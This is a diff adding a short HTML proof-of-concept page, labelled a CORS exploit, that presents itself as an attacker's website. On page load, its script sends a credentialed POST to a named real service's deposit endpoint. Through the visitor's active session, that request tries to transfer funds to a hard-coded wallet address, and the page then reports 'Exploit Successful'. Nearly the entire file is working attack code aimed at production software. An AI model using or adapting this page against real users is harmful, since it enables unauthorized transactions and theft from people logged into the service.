@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fake Site - CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>This page simulates an attacker's website.</h1>
+    <p>If Pump.fun is vulnerable, it will make unauthorized API calls.</p>
+    
+    <script>
+        // Target Pump.fun's deposit endpoint
+        const targetUrl = "https://swap.pump.fun/deposit";
+        
+        // Simulate a malicious transaction
+        fetch(targetUrl, {
+            method: "POST",
+            credentials: "include", // Uses your active session
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                amount: 100, // Test amount
+                to: "HXSPRDbxoLpsFHEg4xWetcqDRQFK2pPW1f4tkfMsJAAR", // Replace with your test wallet
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Attack successful! Response:", data);
+            document.write("<h2>Exploit Successful!</h2>");
+            document.write("<pre>" + JSON.stringify(data, null, 2) + "</pre>");
+        })
+        .catch(error => {
+            console.error("Attack failed:", error);
+            document.write("<h2>Exploit Failed (Check Console)</h2>");
+        });
+    </script>
+</body>
+</html>
